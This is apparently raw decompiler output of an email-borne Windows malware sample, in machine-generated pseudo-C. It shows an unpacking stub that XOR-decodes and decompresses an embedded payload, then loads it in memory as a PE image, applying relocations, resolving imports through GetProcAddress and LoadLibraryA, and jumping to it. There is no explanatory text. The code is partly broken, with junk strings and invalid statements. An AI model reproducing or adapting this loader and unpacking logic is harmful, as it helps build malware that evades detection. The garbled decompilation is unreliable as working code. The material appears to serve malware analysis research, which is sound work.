/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_2580/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401040 - 0x00401080
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401040(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    for(*L00428628 = 0; *L00428628 < A10; *L00428628 = eax) {
        *(A8 + *L00428628) = *(Ac + *L00428628);
        eax = *L00428628 + 1;
    }
}

/*	Procedure: 0x00401081 - 0x0040108F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401081()
{



}

/* DEST BLOCK NOT FOUND: 00401336 -> 00401370 */
/*	Procedure: 0x004010E0 - 0x0040134F
 *	Argument size: 0
 *	Local size: 336
 *	Save regs size: 12
 */

__entry_point__()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffeb0;
	/* unknown */ void  Vfffffeb4;
	/* unknown */ void  Vfffffeb8;
	/* unknown */ void  Vfffffeb9;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffffc;



    (save)0x4284a4;
    (save)0x428660;
    *__imp__lstrcpyA();
    (save)0;
    Vfffffff0 = *__imp__GetModuleHandleA();
    (save)32512;
    (save)0;
    *__imp__LoadIconA();
    (save)300;
    (save) & Vfffffeb8;
    *__imp__GetWindowsDirectoryA();
    if((Vfffffeb9 & 255) != 58) {
        eax = 0;
    } else {
        (save)"\hh.ex";
        (save) & Vfffffeb8;
        *__imp__lstrcatA();
        (save)"e";
        (save) & Vfffffeb8;
        *__imp__lstrcatA();
        (save)0;
        (save)128;
        (save)3;
        (save)0;
        (save)3;
        (save)1;
        (save) & Vfffffeb8;
        Vfffffff4 = *__imp__CreateFileA();
        if(Vfffffff4 == -1) {
            (save)"aCACACACXCXb";
            (save)0x428660;
            *__imp__lstrcpyA();
            eax = 0;
        } else {
            (save)"aAACAAAXAXAXXAb";
            (save)0x428660;
            *__imp__lstrcpyA();
            (save)300;
            (save) & Vfffffeb8;
            *__imp__GetWindowsDirectoryA();
            if((Vfffffeb9 & 255) != 58) {
                (save)"aAAXXCAb";
                (save)0x428660;
                *__imp__lstrcpyA();
                eax = 0;
            } else {
                (save)"\hCCXCXXAXAAh.exe";
                (save) & Vfffffeb8;
                *__imp__lstrcatA();
                (save)0;
                (save)128;
                (save)3;
                (save)0;
                (save)3;
                (save)1;
                (save) & Vfffffeb8;
                Vfffffff4 = *__imp__CreateFileA();
                if(Vfffffff4 != -1) {
                    (save)"aACCAAXXAXACCXCCACCb";
                    (save)0x428660;
                    *__imp__lstrcpyA();
                    eax = 0;
                } else {
                    Vffffffe8 = 0x424222;
                    Vfffffeb4 = *Vffffffe8;
                    Vfffffeb0 = *(Vffffffe8 + 4);
                    (save)"CAAAA";
                    (save)0x428660;
                    *__imp__lstrcpyA();
                    for(Vfffffffc = 0; Vfffffffc < Vfffffeb4; Vfffffffc = Vfffffffc + 8) {
                        (save)0;
                        *__imp__GetModuleHandleA();
                        *(Vffffffe8 + Vfffffffc + 8) = *(Vffffffe8 + Vfffffffc + 8) ^ 44444;
                    }
                    *L00428638 = L004017B0(Vfffffeb0);
                    L00401970(Vffffffe8 + 8, *L00428638, Vfffffeb4);
                    *L0042862C = edi;
                    *L00428624 = esi;
                    *L00428634 = ebx;
                    ecx = -1;
                    *L0042863C = *%fs:ecx+0x19];
                    ecx = 1;
                    Vfffffffc = 0x401310;
                    *L00428630 = ebp;
                    L004017E0(Vfffffffc - Vfffffff0, Vfffffff0);
                    L00401370( *L00428638);
                    edi = *L0042862C;
                    ebx = *L00428634;
                    esp = *L00428630;
                    esi = *L00428624;
                    esp = esp + 4;
                    goto ( *L00428640);
                    eax = 0;
                }
            }
        }
    }
    return;
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401350 - 0x0040136F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401350(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *(ebp - 4) = *__imp__GetProcAddress(A8, Ac, ecx);
    return(*(ebp - 4));
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401370 - 0x004017AE
 *	Argument size: -196
 *	Local size: 200
 *	Save regs size: 0
 */

L00401370(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffff38;
	/* unknown */ void  Vffffff3c;
	/* unknown */ void  Vffffff40;
	/* unknown */ void  Vffffff48;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    (save)"kernel32.dll";
    Vffffff40 = *__imp__GetModuleHandleA();
    (save)"aXAXCXAAACXCXCXAb";
    (save) & Vffffff48;
    *__imp__lstrcpyA();
    Vfffffff8 = 0;
    (save)"UnmapViewOfFile";
    (save)Vffffff40;
    Vffffffc4 = *__imp__GetProcAddress();
    Vfffffff8 = 0;
    (save)"CreateFileMappingA";
    (save)Vffffff40;
    Vfffffffc = *__imp__GetProcAddress();
    Vfffffff8 = 0;
    (save)"VirtualAlloc";
    (save)Vffffff40;
    Vffffffbc = *__imp__GetProcAddress();
    (save)"aXCAAXCAb";
    (save) & Vffffff48;
    *__imp__lstrcpyA();
    (save)"LoadLibraryA";
    (save)Vffffff40;
    Vffffffdc = *__imp__GetProcAddress();
    (save)"aAXXXb";
    (save) & Vffffff48;
    *__imp__lstrcpyA();
    (save)"MapViewOfFileEx";
    (save)Vffffff40;
    Vffffffec = *__imp__GetProcAddress();
    (save)"aXCACCAXAb";
    (save) & Vffffff48;
    *__imp__lstrcpyA();
    (save)"VirtualFree";
    (save)Vffffff40;
    Vfffffff0 = *__imp__GetProcAddress();
    Vfffffff8 = 0;
    (save)"UnmapViewOfFile";
    (save)Vffffff40;
    Vffffffc4 = *__imp__GetProcAddress();
    Vffffff3c = A8;
    Vffffffc0 = A8 + *(Vffffff3c + 60);
    Vffffffd4 = Vffffffc0 + ( *(Vffffffc0 + 20) & 65535) + 24;
    (save)64;
    (save)12288;
    (save) *(Vffffffc0 + 80);
    (save)0;
    Vffffffcc = Vffffffbc();
    edx = *(Vffffffc0 + 6) & 65535;
    40 = edx * edx;
    L00401040(Vffffffcc, A8, *(Vffffff3c + 60) + edx + 312);
    for(Vfffffff4 = 0; Vfffffff4 < ( *(Vffffffc0 + 6) & 65535); Vfffffff4 = Vfffffff4 + 1) {
        if(*(Vffffffd4 + 20) != 0 && *(Vffffffd4 + 16) != 0) {
            eax = *(Vffffffd4 + 16) + *(Vffffffc0 + 60) - 1;
            ecx = Vffffffc0;
            edx = 0;
            *(ecx + 60) = *(ecx + 60) / *(ecx + 60);
            edx = *(ecx + 60) % *(ecx + 60);
            *(Vffffffc0 + 60) = *(Vffffffc0 + 60) * eax;
            L00401040(Vffffffcc + *(Vffffffd4 + 12), A8 + *(Vffffffd4 + 20), eax);
        }
        Vffffffd4 = Vffffffd4 + 40;
    }
    Vffffff3c = Vffffffcc;
    Vffffffc0 = Vffffff3c + *(Vffffff3c + 60);
    (save)0;
    (save) *(Vffffffc0 + 80);
    (save)0;
    (save)4;
    (save)0;
    (save)-1;
    Vfffffff8 = Vfffffffc();
    for(Vffffff38 = Vffffffcc + *(Vffffffc0 + 128); *(Vffffff38 + 16) != 0; Vffffff38 = Vffffff38 + 20) {
        (save)Vffffffcc + *(Vffffff38 + 12);
        Vffffffe4 = Vffffffdc();
        if(*Vffffff38 == 0) {
            Vffffffd8 = Vffffffcc + *(Vffffff38 + 16);
            Vffffffc8 = Vffffffcc + *Vffffff38;
        } else {
            Vffffffd8 = Vffffffcc + *Vffffff38;
            Vffffffc8 = Vffffffcc + *(Vffffff38 + 16);
        }
        Vffffffe8 = 0;
        if(*(Vffffff38 + 16) != 0 && *Vffffff38 != 0) {
            Vffffffe8 = 1;
        }
        while(*Vffffffd8 != 0) {
            *Vffffffd8 = ecx = *Vffffffd8 & -2147483648 ? L00401350(Vffffffe4, *Vffffffd8 + Vffffffcc + 2) : L00401350(Vffffffe4, *Vffffffd8 & 2147483647);
            if(Vffffffe8 != 0) {
                *Vffffffc8 = *Vffffffd8;
            }
            Vffffffd8 = Vffffffd8 + 4;
            Vffffffc8 = Vffffffc8 + 4;
        }
    }
    (save) *(Vffffffc0 + 52);
    (save)0;
    (save)0;
    (save)0;
    (save)34;
    (save)Vfffffff8;
    *L00428620 = Vffffffec();
    if(*L00428620 == 0) {
        (save) *(Vffffffc0 + 52);
        if(Vffffffc4() == 0) {
            (save)32768;
            (save)0;
            (save) *(Vffffffc0 + 52);
            if(*__imp__VirtualFree() != 0) {
                goto L0040170f;
            }
            eax = 0;
            goto L004017a9;
        }
L0040170f:
        (save) *(Vffffffc0 + 52);
        (save)0;
        (save)0;
        (save)0;
        (save)34;
        (save)Vfffffff8;
        *L00428620 = *__imp__MapViewOfFileEx();
        if(*L00428620 == 0) {
            (save)64;
            (save)12288;
            (save) *(Vffffffc0 + 80);
            (save) *(Vffffffc0 + 52);
            *L00428620 = *__imp__VirtualAlloc();
        }
    }
    (save)Vfffffff8;
    *__imp__CloseHandle();
    L00401040( *L00428620, Vffffffcc, *(Vffffffc0 + 80));
    L00401940( *L00428620);
    *L00428640 = *L00428620 + *(Vffffffc0 + 40);
    *(Vffffffc0 + 40) = *L00428640;
    eax = 1;
L004017a9:
}

/*	Procedure: 0x004017AF - 0x004017AF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004017AF()
{



    asm("int3");
}

/*	Procedure: 0x004017B0 - 0x004017D7
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004017B0(A8)
/* unknown */ void  A8;
{



    *(ebp - 4) = 1;
    *(ebp - 4) = *__imp__VirtualAlloc(0, A8, 12288, 4, ecx);
    return(*(ebp - 4));
}

/*	Procedure: 0x004017D8 - 0x004017DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004017D8()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004017E0 - 0x00401939
 *	Argument size: 8
 *	Local size: 32
 *	Save regs size: 4
 */

L004017E0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffe0 = Ac;
    Vfffffff0 = Vffffffe0 + *(Vffffffe0 + 60);
    (save)"VirtualAlloc";
    (save)"kernel32.dll";
    (save) *__imp__GetModuleHandleA();
    Vffffffec = *__imp__GetProcAddress();
    (save)64;
    (save)12288;
    (save) *(Vfffffff0 + 80);
    (save)0;
    *L00428620 = Vffffffec();
    if(*L00428620 == 0) {
        eax = 2;
    } else {
        L00401040( *L00428620, Vffffffe0, *(Vfffffff0 + 80));
        Vffffffe8 = *L00428620 - Vffffffe0;
        if(*(Vfffffff0 + 164) != 0) {
            for(Vfffffff8 = Vffffffe0 + *(Vfffffff0 + 160); *(Vfffffff8 + 4) != 0; Vfffffff8 = Vfffffff8 + *(Vfffffff8 + 4)) {
                Vfffffff4 = *(Vfffffff8 + 4) - 8 >> 1;
                Vffffffe4 = Vfffffff8 + 8;
                for(Vfffffffc = 0; Vfffffffc < Vfffffff4; Vfffffffc = Vfffffffc + 1) {
                    if(( *(Vffffffe4 + Vfffffffc * 2) & 65535) >> 12 == 3) {
                        *( *L00428620 + *Vfffffff8 + ( *(Vffffffe4 + Vfffffffc * 2) & 65535 & 4095)) = *( *L00428620 + *Vfffffff8 + ( *(Vffffffe4 + Vfffffffc * 2) & 65535 & 4095)) + Vffffffe8;
                    }
                }
            }
        }
        eax = 0;
        eax = 0;
        goto (A8 + *L00428620);
    }
}

/*	Procedure: 0x0040193A - 0x0040193F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040193A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401940 - 0x00401963
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401940(A8)
/* unknown */ void  A8;
{



    edx = 0;
    edx = *L0042863C;
    eax = 2198;
    *%ds:eax+0x8] = A8;
    return(*%ds:edx+eax+0xfffff79a]);
}

/*	Procedure: 0x00401964 - 0x0040196F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401964()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401970 - 0x00401A81
 *	Argument size: -132
 *	Local size: 144
 *	Save regs size: 0
 */

L00401970(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff3;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vffffffff;



    Vfffffff8 = 1;
    Vfffffff3 = *A8;
    (save)"aACXXCXXAb";
    (save) & Vffffff70;
    *__imp__lstrcpyA();
    Vffffffec = 0;
    do {
        Vffffffff = *(A8 + Vfffffff8);
        Vfffffff8 = Vfffffff8 + 1;
        if((Vffffffff & 255) != (Vfffffff3 & 255)) {
            *(Ac + Vffffffec) = Vffffffff;
            eax = Vffffffec + 1;
            Vffffffec = eax;
        } else {
            if(( *(A8 + Vfffffff8) & 255) != 0) {
                Vfffffff8 = L00401A90( & Vfffffff4, A8 + Vfffffff8) + Vfffffff8;
                eax = L00401A90( & Vffffffe4, A8 + Vfffffff8) + Vfffffff8;
                Vfffffff8 = eax;
                for(Vffffffe8 = 0; Vffffffe8 < Vfffffff4; Vffffffe8 = eax) {
                    *(Ac + Vffffffec) = *(Ac + Vffffffec - Vffffffe4);
                    Vffffffec = Vffffffec + 1;
                    eax = Vffffffe8 + 1;
                }
            } else {
                *(Ac + Vffffffec) = Vfffffff3;
                eax = Vffffffec + 1;
                Vffffffec = eax;
                Vfffffff8 = Vfffffff8 + 1;
            }
        }
    } while(Vfffffff8 < A10);
}

/*	Procedure: 0x00401A82 - 0x00401A8F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401A82()
{



}

/*	Procedure: 0x00401A90 - 0x00401AFF
 *	Argument size: -120
 *	Local size: 128
 *	Save regs size: 0
 */

L00401A90(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = 0;
    Vfffffff4 = 0;
    *__imp__lstrcpyA( & Vffffff80, "ACXACXCCXCCCCACX");
    do {
        Vfffffff8 = *Ac & 255;
        Ac = Ac + 1;
        Vfffffff0 = Vfffffffc << 7;
        Vfffffffc = Vfffffff8 & 127 | Vfffffff0;
        Vfffffff4 = Vfffffff4 + 1;
    } while(ecx = Vfffffff8 & 128);
    *A8 = Vfffffffc;
    return(Vfffffff4);
}

/*	Procedure: 0x00401B00 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B00()
{



}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401004       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetWindowsDirectoryA;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00401010       0 */ /* unknown */ void 	__imp__lstrcpyA;
/* 0x00401014       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401018       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401020       0 */ /* unknown */ void 	__imp__MapViewOfFileEx;
/* 0x00401024       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__LoadIconA;
/* 0x004010e0       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
